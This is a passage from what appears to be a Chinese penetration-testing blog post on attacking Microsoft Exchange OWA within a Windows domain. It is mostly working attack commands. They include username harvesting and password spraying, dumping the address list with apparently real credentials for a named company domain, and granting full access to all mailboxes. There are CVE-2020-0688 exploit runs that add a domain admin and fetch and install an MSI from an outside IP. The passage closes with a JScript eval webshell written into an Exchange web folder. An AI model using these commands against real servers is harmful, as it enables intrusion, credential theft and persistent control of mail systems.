8.03.0279.006</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 8–v2 2012 年 10 月 9 日 8.3.279.5 8.03.0279.005</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 8 2012 年 8 月 13 日 8.3.279.3 8.03.0279.003</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 7 2012 年 4 月 16 日 8.3.264.0 8.03.0264.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 6 2012 年 1 月 26 日 8.3.245.2 8.03.0245.002</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 5 2011 年 9 月 21 日 8.3.213.1 8.03.0213.001</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 4 2011 年 5 月 28 日 8.3.192.1 8.03.0192.001</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 3-v2 2011 年 3 月 30 日 8.3.159.2 8.03.0159.002</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 2 2010 年 12 月 10 日 8.3.137.3 8.03.0137.003</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 1 2010 年 9 月 9 日 8.3.106.2 8.03.0106.002</span><br><span class="line">Exchange Server 2007 SP3 2010 年 6 月 7 日 8.3.83.6 8.03.0083.006</span><br></pre></td></tr></table></figure>

<h3 id="用户名爆破"><a href="#用户名爆破" class="headerlink" title="用户名爆破"></a>用户名爆破</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\MailSniper.ps1</span><br><span class="line">Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt</span><br></pre></td></tr></table></figure>

<h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\MailSniper.ps1</span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile owa-sprayed-creds.txt</span><br><span class="line">Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile sprayed-ews-creds.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruler-win64.exe --domain mail.tfzq.com brute --users global-address-list.txt -p FastPwds.txt --delay 0 -v</span><br></pre></td></tr></table></figure>



<h3 id="导出联系人"><a href="#导出联系人" class="headerlink" title="导出联系人"></a>导出联系人</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\MailSniper.ps1</span><br><span class="line">Get-GlobalAddressList -ExchHostname mail.tfzq.com -UserName tfzq\tyservice -Password 2017TFzq -OutFile global-address-list.txt</span><br></pre></td></tr></table></figure>

<h3 id="遍历其它邮箱权限"><a href="#遍历其它邮箱权限" class="headerlink" title="遍历其它邮箱权限"></a>遍历其它邮箱权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\MailSniper.ps1</span><br><span class="line">Invoke-OpenInboxFinder -EmailList global-address-list.txt -ExchHostname mail.tfzq.com -Remote</span><br></pre></td></tr></table></figure>

<h3 id="授权用户可打开其他邮箱"><a href="#授权用户可打开其他邮箱" class="headerlink" title="授权用户可打开其他邮箱"></a>授权用户可打开其他邮箱</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.powershellgallery.com/packages/ExchangeOnlineManagement/2.0.3</span><br><span class="line">Install-Package https://psg-prod-eastus.azureedge.net/packages/exchangeonlinemanagement.2.0.3.nupkg</span><br><span class="line">Install-Module -Name ExchangeOnlineManagement -RequiredVersion 2.0.3</span><br><span class="line"></span><br><span class="line">在exchange的管理shell中执行</span><br><span class="line">Get-Mailbox -ResultSize unlimited -Filter &#123;(RecipientTypeDetails -eq <span class="string">&#x27;UserMailbox&#x27;</span>) -and (Alias -ne <span class="string">&#x27;Admin&#x27;</span>)&#125; | Add-MailboxPermission -User Administrator@jj.local -AccessRights fullaccess -InheritanceType all</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2020-16875"><a href="#CVE-2020-16875" class="headerlink" title="CVE-2020-16875"></a>CVE-2020-16875</h3><p>条件：任意可登录邮箱的账号密码</p>
<p>效果：RCE</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">影响范围:</span><br><span class="line">Microsoft Exchange Server 2016 Cumulative Update 16</span><br><span class="line">Microsoft Exchange Server 2016 Cumulative Update 17</span><br><span class="line">Microsoft Exchange Server 2019 Cumulative Update 5</span><br><span class="line">Microsoft Exchange Server 2019 Cumulative Update 6</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploit-framework&#x2F;pull&#x2F;14126</span><br><span class="line">https:&#x2F;&#x2F;srcincite.io&#x2F;pocs&#x2F;cve-2020-16875.py.txt</span><br></pre></td></tr></table></figure>



<h3 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h3><p>条件：任意可登录邮箱的账号密码</p>
<p>效果：反序列化RCE</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">影响范围:</span><br><span class="line">Microsoft Exchange Server 2010 Service Pack 3</span><br><span class="line">Microsoft Exchange Server 2013</span><br><span class="line">Microsoft Exchange Server 2016</span><br><span class="line">Microsoft Exchange Server 2019</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;cve-2020-0688</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zcgonvh&#x2F;CVE-2020-0688</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">py3 cve-2020-0688.py -s https:&#x2F;&#x2F;mail.tfzq.com&#x2F;owa -u tfzq\tyservice -p 2017TFzq -c &quot;ping bo3s1v.dnslog.cn&quot;</span><br><span class="line">py3 cve-2020-0688.py -s https:&#x2F;&#x2F;mail.tfzq.com&#x2F;owa -u tfzq\tyservice -p 2017TFzq -c &quot;net user aspnet 1qaz@WSXX &#x2F;add &#x2F;domain&quot;</span><br><span class="line">py3 cve-2020-0688.py -s https:&#x2F;&#x2F;mail.tfzq.com&#x2F;owa -u tfzq\tyservice -p 2017TFzq -c &quot;net group \&quot;domain admins\&quot; tyservice &#x2F;add &#x2F;domain&quot;</span><br><span class="line">py3 cve-2020-0688.py -s https:&#x2F;&#x2F;mail.tfzq.com&#x2F;owa -u tfzq\tyservice -p 2017TFzq -c &quot;msiexec &#x2F;passive &#x2F;i http:&#x2F;&#x2F;39.98.227.230:8000&#x2F;install.msi&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20201216132604741.png" alt="image-20201216132604741"></p>
<p><img src="/images/image-20201216132623934.png" alt="image-20201216132623934"></p>
<p><img src="/images/image-20201216132643457.png" alt="image-20201216132643457"></p>
<p><img src="/images/image-20201216132515350.png" alt="image-20201216132515350"></p>
<h3 id="webshell-路径"><a href="#webshell-路径" class="headerlink" title="webshell 路径"></a>webshell 路径</h3><p>写shell注意几点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;ecp&#x2F;目录下不是所有文件名都可以，要在&#x2F;ecp&#x2F;web.config中定义了的才行，一般使用 LiveIdError.aspx OrgIdError.aspx</span><br><span class="line">&#x2F;ecp&#x2F;目录需要登录后的Cookie</span><br><span class="line">webshell不能用冰蝎、天蝎，要用蚁剑原始shell，上传后可在文件编辑中替换为xor版本</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">handlers</span> <span class="attr">accessPolicy</span>=<span class="string">&quot;Read, Script&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;DownloadHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;Download.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;GET,POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Microsoft.Exchange.Management.ControlPanel.DownloadHandler&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;ProxyLogonHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;proxyLogon.ecp&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Microsoft.Exchange.Management.ControlPanel.ProxyLogonHandler&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;LiveIdErrorHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;LiveIdError.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;EducationPage&quot;</span> <span class="attr">path</span>=<span class="string">&quot;Education.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;OrgIdErrorHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;OrgIdError.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;PageHandlerFactory-Integrated&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;SlabHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*.slab&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Microsoft.Exchange.Management.ControlPanel.SlabHandler&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;ImportContactList&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*/ImportContactList.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;Ashxhandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*.ashx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.SimpleHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;UploadPolicyFromISV&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*/ManagePolicyFromISV.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;EmailTemplatesHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;OsiTemplateForAlertUpdateEmail*.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;OsiAttachmentsHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*AttachmentOperations.ashx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;GET,POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.SimpleHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">handlers</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exec cmd.exe &#x2F;c echo %ExchangeInstallPath%</span><br><span class="line"></span><br><span class="line">C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\ExpiredPassword.aspx</span><br><span class="line">https:&#x2F;&#x2F;mail.tfzq.com&#x2F;owa&#x2F;auth&#x2F;ExpiredPassword.aspx</span><br><span class="line"></span><br><span class="line">C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\ecp\LiveIdError.aspx</span><br><span class="line">https:&#x2F;&#x2F;mail.tfzq.com&#x2F;ecp&#x2F;LiveIdError.aspx</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec cmd &#x2F;c echo ^&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;qax&quot;],&quot;unsafe&quot;);%^&gt; &gt; C:\Progra~1\Microsoft\Exchan~1\V15\ClientAccess\ecp\OrgIdError.aspx</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">AT</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://kb-at-zero.github.io/2021/06/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/">https://kb-at-zero.github.io/2021/06/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://kb-at-zero.github.io" target="_blank">KB-AT的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a></div><div class="post_share"><div class="social-share" data-image="/images/ad.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/09/26/frp%E6%94%B9%E9%80%A0/"><img class="prev-cover" src="/images/frp.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">frp改造</div></div></a></div><div class="next-post pull-right"><a href="/2021/06/14/%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/"><img class="next-cover" src="/images/image-20221111160018658.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">免杀总结</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/touxiang.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">AT</div><div class="author-info__description">网络安全 | 渗透测试 | Web安全 ｜ 内网渗透</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/kb-at-zero"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">记录、学习、分享、成长</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">域渗透总结学习</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">2.</span> <span class="toc-text">注意事项</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">域信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#net%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-number">3.0.1.</span> <span class="toc-text">net相关命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dsquery"><span class="toc-number">3.0.2.</span> <span class="toc-text">dsquery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldapsearch"><span class="toc-number">3.0.3.</span> <span class="toc-text">ldapsearch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AdFind"><span class="toc-number">3.0.4.</span> <span class="toc-text">AdFind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setspn"><span class="toc-number">3.0.5.</span> <span class="toc-text">setspn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldapadmin"><span class="toc-number">3.0.6.</span> <span class="toc-text">ldapadmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPP"><span class="toc-number">3.0.7.</span> <span class="toc-text">GPP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97"><span class="toc-number">3.0.8.</span> <span class="toc-text">日志</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.</span> <span class="toc-text">票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.0.1.</span> <span class="toc-text">缓存票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.0.2.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-by-ticket"><span class="toc-number">4.0.3.</span> <span class="toc-text">黄金票据(by ticket)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.0.4.</span> <span class="toc-text">白银票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">4.0.5.</span> <span class="toc-text">非约束委派</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">4.0.6.</span> <span class="toc-text">约束委派</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">4.0.7.</span> <span class="toc-text">基于资源的约束委派</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E9%94%AE%E6%89%93%E5%9F%9F%E6%8E%A7"><span class="toc-number">5.</span> <span class="toc-text">一键打域控</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MS14-068"><span class="toc-number">5.0.1.</span> <span class="toc-text">MS14-068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-1040"><span class="toc-number">5.0.2.</span> <span class="toc-text">CVE-2019-1040</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-1472"><span class="toc-number">5.0.3.</span> <span class="toc-text">CVE-2020-1472</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9Fhash"><span class="toc-number">6.</span> <span class="toc-text">域hash</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz"><span class="toc-number">6.0.1.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ntdsutil%E5%AF%BC%E5%87%BA%E5%BF%AB%E7%85%A7"><span class="toc-number">6.0.2.</span> <span class="toc-text">ntdsutil导出快照</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vssadmin%E5%88%9B%E5%BB%BA%E5%8D%B7%E5%BD%B1"><span class="toc-number">6.0.3.</span> <span class="toc-text">vssadmin创建卷影</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Invoke-NinjaCopy"><span class="toc-number">6.0.4.</span> <span class="toc-text">Invoke-NinjaCopy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8Entds-dit%E8%BF%98%E5%8E%9F"><span class="toc-number">6.0.5.</span> <span class="toc-text">从ntds.dit还原</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA"><span class="toc-number">7.</span> <span class="toc-text">中间人</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM%E4%B8%AD%E7%BB%A7"><span class="toc-number">7.0.1.</span> <span class="toc-text">NTLM中继</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-1040-1"><span class="toc-number">7.0.2.</span> <span class="toc-text">CVE-2019-1040</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM%E5%88%A9%E7%94%A8"><span class="toc-number">7.0.3.</span> <span class="toc-text">NTLM利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PTH"><span class="toc-number">7.0.3.1.</span> <span class="toc-text">PTH</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">7.0.3.1.1.</span> <span class="toc-text">远程桌面</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PTH%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7"><span class="toc-number">7.0.3.2.</span> <span class="toc-text">PTH其他工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#crackmapexec%E7%88%86%E7%A0%B4"><span class="toc-number">7.0.3.3.</span> <span class="toc-text">crackmapexec爆破</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OWA"><span class="toc-number">8.</span> <span class="toc-text">OWA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E6%9F%A5%E7%9C%8B"><span class="toc-number">8.0.1.</span> <span class="toc-text">版本查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%90%8D%E7%88%86%E7%A0%B4"><span class="toc-number">8.0.2.</span> <span class="toc-text">用户名爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">8.0.3.</span> <span class="toc-text">密码爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E8%81%94%E7%B3%BB%E4%BA%BA"><span class="toc-number">8.0.4.</span> <span class="toc-text">导出联系人</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%8D%E5%8E%86%E5%85%B6%E5%AE%83%E9%82%AE%E7%AE%B1%E6%9D%83%E9%99%90"><span class="toc-number">8.0.5.</span> <span class="toc-text">遍历其它邮箱权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%88%E6%9D%83%E7%94%A8%E6%88%B7%E5%8F%AF%E6%89%93%E5%BC%80%E5%85%B6%E4%BB%96%E9%82%AE%E7%AE%B1"><span class="toc-number">8.0.6.</span> <span class="toc-text">授权用户可打开其他邮箱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-16875"><span class="toc-number">8.0.7.</span> <span class="toc-text">CVE-2020-16875</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-0688"><span class="toc-number">8.0.8.</span> <span class="toc-text">CVE-2020-0688</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell-%E8%B7%AF%E5%BE%84"><span class="toc-number">8.0.9.</span> <span class="toc-text">webshell 路径</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/12/19/%E7%BA%A2%E9%98%9Fjava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/" title="红队java代码审计生命周期"><img src="/images/antivirus.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红队java代码审计生命周期"/></a><div class="content"><a class="title" href="/2022/12/19/%E7%BA%A2%E9%98%9Fjava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/" title="红队java代码审计生命周期">红队java代码审计生命周期</a><time datetime="2022-12-19T08:19:00.000Z" title="发表于 2022-12-19 16:19:00">2022-12-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/20/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" title="验证码识别&amp;暴力破解"><img src="/images/ddddocr.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="验证码识别&amp;暴力破解"/></a><div class="content"><a 